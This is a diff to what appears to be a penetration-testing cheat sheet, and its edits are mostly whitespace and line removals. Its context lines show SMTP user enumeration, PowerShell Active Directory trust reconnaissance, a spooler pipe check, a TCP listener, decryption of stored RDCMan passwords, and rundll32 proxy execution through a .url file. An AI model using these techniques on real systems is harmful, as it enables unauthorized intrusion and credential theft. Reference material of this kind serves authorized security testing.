@@ -122,14 +122,10 @@ smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
 
 ```text
 # current domain info
-[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-
 # domain trusts
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 
 # current forest info
-[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
-
 # get forest trust relationships
 ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
 
@@ -179,7 +175,7 @@ powershell ls "\\dc01\pipe\spoolss"
 ```csharp
 # Start listener on port 443
 $listener = [System.Net.Sockets.TcpListener]443; $listener.Start();
- 
+
 while($true)
 {
     $client = $listener.AcceptTcpClient();
@@ -1013,7 +1009,6 @@ Remote Desktop Connection Manager passwords can be decrypted on the same compute
 Copy-Item 'C:\Program Files (x86)\Microsoft\Remote Desktop Connection Manager\RDCMan.exe C:\temp\RDCMan.dll’
 Import-Module C:\temp\RDCMan.dll
 $EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
-[RdcMan.Encryption]::DecryptString($PwdString, $EncryptionSettings)
 ```
 
 ### Decrypting VNC Password
@@ -1081,7 +1076,7 @@ rundll32 c:\windows\system32\ieframe.dll,OpenURL c:\temp\test.url
 {% endtab %}
 
 {% tab title="test.url" %}
-```
+```text
 [internetshortcut]
 url=c:\windows\system32\calc.exe
 ```
